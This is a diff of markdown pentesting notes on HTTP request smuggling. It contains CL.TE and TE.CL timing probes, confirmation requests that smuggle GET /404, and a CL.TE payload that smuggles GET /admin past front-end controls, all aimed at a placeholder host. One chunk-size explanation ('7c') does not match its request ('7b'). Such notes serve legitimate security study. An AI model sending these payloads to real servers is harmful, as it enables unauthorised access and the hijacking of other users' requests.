@@ -2,14 +2,29 @@
 
 ## HTTP request smuggling
 
-### General info
+<details>
+
+<summary>General info</summary>
 
 * HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
+
+<!---->
+
 * Request smuggling is associated to HTTP/1 requests but can also affect HTTP/2-supported websites based on their backend structure.
+
+<!---->
+
 * Modern web apps often use chains of HTTP servers, with users sending requests to a front-end server (sometimes referred to as a load balancer or reverse proxy), which in turn forwards requests to multiple back-end servers.
+
+<!---->
+
 * Front-end and back-end systems must agree on request boundaries to prevent ambiguous requests that attackers can exploit
 
-### How do HTTP request smuggling vulnerabilities arise?
+</details>
+
+<details>
+
+<summary>How do HTTP request smuggling vulnerabilities arise?</summary>
 
 * HTTP request smuggling vulnerabilities often occur due to the HTTP/1 specification offering two methods to define the request's end: the `Content-Length header` and `Transfer-Encoding` header.
   * The `Content-Length header` specifies the length of the message body in bytes
@@ -19,7 +34,7 @@
   * TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
   * TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
 
-```
+```http
 POST /search HTTP/1.1
 Host: normal-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -30,11 +45,17 @@ q=smuggling
 0
 ```
 
-### Finding HTTP request smuggling vulnerabilities
+</details>
 
-#### Finding CL.TE vulnerabilities using timing techniques
+## <mark style="color:yellow;">Identification</mark>
 
-```
+{% hint style="warning" %}
+**Important**: use HTTP/1.1 protocol, not HTTP/2
+{% endhint %}
+
+### <mark style="color:yellow;">**CL.TE**</mark>
+
+```http
 POST / HTTP/1.1\r\n
 Host: vulnerable-website.com\r\n
 Transfer-Encoding: chunked\r\n
@@ -42,14 +63,17 @@ Content-Length: 4\r\n
 \r\n
 1\r\n
 A\r\n
-X\r\n
+X
 ```
 
-The back-end server processes the first chunk using the Transfer-Encoding header, leading to an observable time delay while awaiting the next chunk.
+`Content-Length=4` -> `1` `\r` `\n` `A`
 
-#### Finding TE.CL vulnerabilities using timing techniques
+* The **front-end** server processes the initial chunk based on the Transfer-Encoding header, forwarding only part of the request while omitting the `X`.&#x20;
+* After processing the first chunk, the **backend** server waits for the next one, causing a noticeable time delay.
 
-```
+### <mark style="color:yellow;">TE.CL</mark>
+
+```http
 POST / HTTP/1.1\r\n
 Host: vulnerable-website.com\r\n
 Transfer-Encoding: chunked\r\n
@@ -60,88 +84,120 @@ Content-Length: 6\r\n
 X
 ```
 
-* The back-end server, relying on the Content-Length header, waits for additional message body content, resulting in a noticeable time delay.
-* NOTE: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
+`Content-Length=6` -> `0` `\r` `\n` `\r` `\n` `X`
 
-### How to perform an HTTP request smuggling attack
+The back-end server, relying on the Content-Length header, waits for additional message body content, resulting in a noticeable time delay.
 
-#### CL.TE
+{% hint style="warning" %}
+**Warning**: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
+{% endhint %}
 
+## <mark style="color:yellow;">Confirmation</mark>
+
+### <mark style="color:yellow;">**CL.TE**</mark>
+
+Normal request
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
 ```
-POST / HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-Content-Length: 13\r\n
-Transfer-Encoding: chunked\r\n
-\r\n
+
+Attack request
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+`Content-Legth: 49` -> all chars until `Foo:x` (include `\r\n`)
+
+`e` (hex) -> Lenght `q=smuggling&x=`
+
+Then send normal request. This will cause the subsequent "normal" request to look like this:
+
+```http
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+The server will respond with status code 404, indicating that the attack successful.
+
+### <mark style="color:yellow;">**TE.CL**</mark>
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7b
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
 0\r\n
 \r\n
-SMUGGLEDGET /second HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-...
 ```
 
-* Content-Length: 0\r\n\r\nSMUGGLED -> 13
-* SMUGGLED ES.: GET / HTTP/1.1\r\nfoo: a
+`7c` -> all chars from `GET` until `x=`
 
-#### TE.CL
+`Content-Legth: 4` -> `7` `c` `\r` `\n`
 
-```
-POST / HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-Content-Length: 4\r\n
-Transfer-Encoding: chunked\r\n
-\r\n
-2a\r\n
-POST /404 HTTP/1.1\r\n
-Content-Length: 9\r\n
-\r\n
-x\r\n
-0\r\n
-\r\n
-```
+{% hint style="info" %}
+**Note**: Update Content-Length must be unchecked
+{% endhint %}
 
-* This post smuggled request has a body: "x" (plus the second request...)
-* Content-Length: 4 -> 2a\r
-* 2a -> POST /404 HTTP/1.1\r\nContent-Length: 9\r\n\r\nx
-* Content-Length: 9 -> x\r\n0\r\n\r\n -> 8, but it must be at least 1 character extra in length to ensure the request gets queued on the backend
+## <mark style="color:yellow;">Exploitation</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
 
-```
-POST / HTTP/1.1\r\n
-Host: vulnerable-website.com\r\n
-Content-Length: 4\r\n
-Transfer-Encoding: chunked\r\n
-\r\n
-29\r\n
-POST /404 HTTP/1.1\r\n
-Content-Length: 8\r\n
-\r\n
-\r\n
-0\r\n
-\r\n
+### <mark style="color:yellow;">Bypass front-end security controls</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
+
+<mark style="color:yellow;">**CL.TE**</mark>
+
+```http
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
 ```
 
-* This request doesn't contain "x" in the body (but will have the second request)
-* This type of request is not very useful (use the first) but it can be useful to understand the lengths
-* Content-Length: 4 -> 2a\r
-* 2a -> POST /404 HTTP/1.1\r\nContent-Length: 9\r\n\r
-* Content-Length: 8 -> \r\n0\r\n\r\n -> 7 + 1 = 8 (minimum)
+When you go to `/home`, the following request will be made&#x20;
 
-```
-Content-Length: 4\r\n
-Transfer-Encoding: chunked\r\n
-\r\n
-26\r\n
-GET /404 HTTP/1.1\r\n
-Content-Length: 6\r\n
-\r\n
-0\r\n
-\r\n
+```http
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
 ```
 
-* Content-Length: 4 -> 2a\r
-* 26 -> GET /404 HTTP/1.1\r\nContent-Length: 6\r
-* Content-Length: 6 -> 0\r\n\r\n -> 5 + 1 = 6 (minimum)
-
-## TE.TE
-
-* TO DO ...
+* The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server.&#x20;
+* The back-end server sees requests for `/home` and `/admin`, assumes they've passed front-end controls, and grants access to the restricted URL.
